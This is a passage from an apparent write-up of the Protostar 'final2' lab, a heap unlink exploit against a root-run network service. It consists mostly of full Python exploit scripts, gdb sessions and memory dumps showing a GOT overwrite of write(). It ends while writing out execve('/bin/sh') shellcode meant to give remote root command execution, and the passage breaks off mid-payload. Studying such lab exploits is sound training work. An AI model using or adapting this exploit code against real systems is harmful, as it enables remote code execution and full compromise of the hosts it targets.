pointer <code>0x804d41c - 12</code> and backward pointer <code>0x804e010</code>. The whole payload must again be 128
bytes. We can just fill with <code>A</code>s.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">FSRD</span> <span class="n">ROOT</span> <span class="mh">0xfffffffc</span> <span class="mh">0xfffffffc</span> <span class="mh">0x804d41c</span> <span class="o">-</span> <span class="mi">12</span> <span class="mh">0x804e010</span> <span class="n">AAAA</span> <span class="o">...</span> <span class="n">AAAA</span>
</span></code></pre></td></tr></table></div></figure>


<p>Before we craft shellcode, let&rsquo;s confirm the exploit will redirect code execution to the proposed
shellcode address. Instead of using actual shellcode, we&rsquo;ll use four bytes of <code>0xcc</code> which is a
one-byte x86 instruction called <a href="https://en.wikipedia.org/wiki/INT_(x86_instruction)"><code>INT3</code></a> that causes the processor to halt the process for any
attached debuggers. If we hit this opcode, our attached gdb debugger receive the <code>SIGTRAP</code> signal.
Let&rsquo;s test with the below Python script.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">REQSZ</span> <span class="o">=</span> <span class="mi">128</span>
</span><span class='line'><span class="n">HOST</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'><span class="n">PORT</span> <span class="o">=</span> <span class="mi">2993</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\xcc\xcc\xcc\xcc</span><span class="s">&#39;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">ba</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="s">&#39;FSRDAAAA&#39;</span><span class="p">,</span> <span class="s">&#39;ascii&#39;</span><span class="p">))</span>
</span><span class='line'><span class="n">ba</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span><span class='line'><span class="n">ba</span> <span class="o">=</span> <span class="n">ba</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">REQSZ</span><span class="p">,</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x41</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">ba</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="s">&#39;/&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">ba</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">ba</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="s">&#39;FSRDROOT/&#39;</span><span class="p">,</span> <span class="s">&#39;ascii&#39;</span><span class="p">))</span>
</span><span class='line'><span class="c"># Use integer overflow to make dlmalloc think third chunk is 4 bytes before second chunk.</span>
</span><span class='line'><span class="n">ba</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0xfffffffc</span><span class="p">)</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0xfffffffc</span><span class="p">))</span>
</span><span class='line'><span class="c"># Add forward and backward pointers</span>
</span><span class='line'><span class="n">ba</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0x804d41c</span> <span class="o">-</span> <span class="mi">12</span><span class="p">)</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0x804e010</span><span class="p">))</span>
</span><span class='line'><span class="n">ba</span> <span class="o">=</span> <span class="n">ba</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">REQSZ</span><span class="p">,</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\x41</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">ba</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Attach gdb to the <code>final2</code> process again.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">ssh</span> <span class="o">-</span><span class="n">o</span> <span class="s">&quot;UserKnownHostsFile=/dev/null&quot;</span> <span class="o">-</span><span class="n">o</span> <span class="s">&quot;StrictHostKeyChecking=no&quot;</span> <span class="n">root</span><span class="nd">@192.168.99.107</span>
</span><span class='line'>
</span><span class='line'><span class="n">root</span><span class="nd">@protostar</span><span class="p">:</span><span class="o">/</span><span class="c"># gdb /opt/protostar/bin/final2 -p 1495</span>
</span><span class='line'><span class="o">...</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="n">follow</span><span class="o">-</span><span class="n">fork</span><span class="o">-</span><span class="n">mode</span> <span class="n">child</span>
</span><span class='line'><span class="n">Current</span> <span class="n">language</span><span class="p">:</span>  <span class="n">auto</span>
</span><span class='line'><span class="n">The</span> <span class="n">current</span> <span class="n">source</span> <span class="n">language</span> <span class="ow">is</span> <span class="s">&quot;auto; currently asm&quot;</span><span class="o">.</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="n">detach</span><span class="o">-</span><span class="n">on</span><span class="o">-</span><span class="n">fork</span> <span class="n">off</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="n">disassembly</span><span class="o">-</span><span class="n">flavor</span> <span class="n">intel</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="nb">set</span> <span class="n">pagination</span> <span class="n">off</span>
</span></code></pre></td></tr></table></div></figure>


<p>Set a breakpoint at the call to <code>write()</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="k">break</span> <span class="o">*</span><span class="n">get_requests</span><span class="o">+</span><span class="mi">186</span>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x804be01</span><span class="p">:</span> <span class="nb">file</span> <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span><span class="p">,</span> <span class="n">line</span> <span class="mf">54.</span>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="o">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Run the Python script in another terminal. Hit enter to send a third packet that&rsquo;s less than 128
bytes to break out of the <code>while(1)</code> loop.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">python</span> <span class="n">final2</span><span class="o">.</span><span class="n">py</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">99.107</span>
</span><span class='line'><span class="o">&lt;</span><span class="n">enter</span><span class="o">&gt;</span>
</span><span class='line'><span class="n">Process</span> <span class="n">OK</span>
</span></code></pre></td></tr></table></div></figure>


<p>The gdb session should hit the breakpoint at <code>write()</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">[</span><span class="n">New</span> <span class="n">process</span> <span class="mi">2622</span><span class="p">]</span>
</span><span class='line'><span class="p">[</span><span class="n">Switching</span> <span class="n">to</span> <span class="n">process</span> <span class="mi">2622</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x0804be01</span> <span class="ow">in</span> <span class="n">get_requests</span> <span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span> <span class="n">at</span> <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">54</span>
</span><span class='line'><span class="mi">54</span>    <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="nb">file</span> <span class="ow">or</span> <span class="n">directory</span><span class="o">.</span>
</span><span class='line'>  <span class="ow">in</span> <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span>
</span><span class='line'><span class="n">Current</span> <span class="n">language</span><span class="p">:</span>  <span class="n">auto</span>
</span><span class='line'><span class="n">The</span> <span class="n">current</span> <span class="n">source</span> <span class="n">language</span> <span class="ow">is</span> <span class="s">&quot;auto; currently c&quot;</span><span class="o">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Examine the first 80 DWORDs. Continue and examine again.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">80</span><span class="n">wx</span> <span class="mh">0x804e000</span>
</span><span class='line'><span class="mh">0x804e000</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000089</span>  <span class="mh">0x44525346</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e010</span><span class="p">:</span> <span class="mh">0xcccccccc</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e020</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e030</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e040</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e050</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e060</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e070</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e080</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x2f414141</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0xfffffffc</span>
</span><span class='line'><span class="mh">0x804e090</span><span class="p">:</span> <span class="mh">0x0804d410</span>  <span class="mh">0x0804e014</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e0a0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e0b0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e0c0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e0d0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e0e0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e0f0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e100</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e110</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000089</span>  <span class="mh">0x0000000a</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804e120</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804e130</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="o">.</span>
</span><span class='line'><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x0804be01</span> <span class="ow">in</span> <span class="n">get_requests</span> <span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span> <span class="n">at</span> <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">54</span>
</span><span class='line'><span class="mi">54</span>    <span class="ow">in</span> <span class="n">final2</span><span class="o">/</span><span class="n">final2</span><span class="o">.</span><span class="n">c</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">80</span><span class="n">wx</span> <span class="mh">0x804e000</span>
</span><span class='line'><span class="mh">0x804e000</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000085</span>  <span class="mh">0x0804d534</span>  <span class="mh">0x0804d534</span>
</span><span class='line'><span class="mh">0x804e010</span><span class="p">:</span> <span class="mh">0xcccccccc</span>  <span class="mh">0x41414141</span>  <span class="mh">0x0804d410</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e020</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e030</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e040</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e050</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e060</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e070</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e080</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x00000084</span>  <span class="mh">0xfffffffc</span>  <span class="mh">0xfffffffc</span>
</span><span class='line'><span class="mh">0x804e090</span><span class="p">:</span> <span class="mh">0x0804d410</span>  <span class="mh">0x0804e014</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e0a0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e0b0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e0c0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e0d0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e0e0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e0f0</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e100</span><span class="p">:</span> <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>  <span class="mh">0x41414141</span>
</span><span class='line'><span class="mh">0x804e110</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000089</span>  <span class="mh">0x0000000a</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804e120</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span><span class='line'><span class="mh">0x804e130</span><span class="p">:</span> <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>  <span class="mh">0x00000000</span>
</span></code></pre></td></tr></table></div></figure>


<p>Memory at <code>0x804e008</code> and <code>0x804e00c</code> have been changed (to addresses before the heap. I guess
because it&rsquo;s some special value for the first chunk). Our INT3 instruction is at <code>0x804e010</code>. Let&rsquo;s
look at the GOT entry for <code>write()</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">i</span> <span class="mh">0x8048dfc</span>
</span><span class='line'><span class="mh">0x8048dfc</span> <span class="o">&lt;</span><span class="n">write</span><span class="nd">@plt</span><span class="o">&gt;</span><span class="p">:</span>  <span class="n">jmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">ds</span><span class="p">:</span><span class="mh">0x804d41c</span>
</span><span class='line'>
</span><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">x</span> <span class="mh">0x804d41c</span>
</span><span class='line'><span class="mh">0x804d41c</span> <span class="o">&lt;</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;</span><span class="p">:</span>    <span class="mh">0x0804e014</span>
</span></code></pre></td></tr></table></div></figure>


<p>Its value is the location of our INT3. This means the next call to <code>write()</code> will redirect code
execution to our INT3 which should cause gdb to break again.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>
</span><span class='line'><span class="n">Continuing</span><span class="o">.</span>
</span><span class='line'>
</span><span class='line'><span class="n">Program</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGTRAP</span><span class="p">,</span> <span class="n">Trace</span><span class="o">/</span><span class="n">breakpoint</span> <span class="n">trap</span><span class="o">.</span>
</span><span class='line'><span class="mh">0x0804e011</span> <span class="ow">in</span> <span class="err">??</span> <span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>It worked!</p>

<h2>Crafting the Shellcode</h2>

<p>So now all we have to is insert some real shellcode that&rsquo;ll own the system. Since final2 is running
as <code>root</code>, let&rsquo;s make the process start a shell. This will allow us send arbitrary commands over TCP
that get executed as root, i.e. remote code execution. <a href="http://shell-storm.org/shellcode/">Shellstorm</a> has a great library of
shellcodes. Let&rsquo;s use <a href="http://shell-storm.org/shellcode/files/shellcode-811.php">&ldquo;Linux/x86 - execve(/bin/sh) - 28 bytes&rdquo;</a>. But we have a
problem. <code>unlink()</code> overwrites the memory at <code>0x804e018</code> (it&rsquo;ll always overwrite four bytes of
memory eight bytes ahead of whatever address we pick), and no useful shellcode is short enough to
fit into eight bytes. What can we do?</p>

<p>If the shellcode could only jump past <code>0x804e018</code> to <code>0x804e01c</code> where we have a huge piece of
contiguous memory. Luckily the <code>jmp</code> instruction (<code>\xeb</code>) does exactly this. Its argument is how many
bytes to jump over. So our shellcode can start with <code>0xeb 0x0a</code> which moves the instruction pointer
10 bytes forward. We fill in the middle 10 bytes with <a href="https://www.aldeid.com/wiki/X86-assembly/Instructions/nop"><code>nop</code></a>s (<code>0x90</code>). Our final script will
be this.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">REQSZ</span> <span class="o">=</span> <span class="mi">128</span>
</span><span class='line'><span class="n">HOST</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'><span class="n">PORT</span> <span class="o">=</span> <span class="mi">2993</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Two bytes for &quot;jmp 0x0c&quot;, two bytes of nop padding to fill out the word,</span>
</span><span class='line'><span class="c"># eight more nop bytes (second nop DWORD will be clobbered by unlink()),</span>
</span><span class='line'><span class="c"># then actual shellcode from http://shell-storm.org/shellcode/files/shellcode-811.php</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\xeb\x0a\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">&#39;</span> \
</span><span class='line'>            <span class="n">b</span><span class="s">&#39;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69</span><span class="s">&#39;</span> \
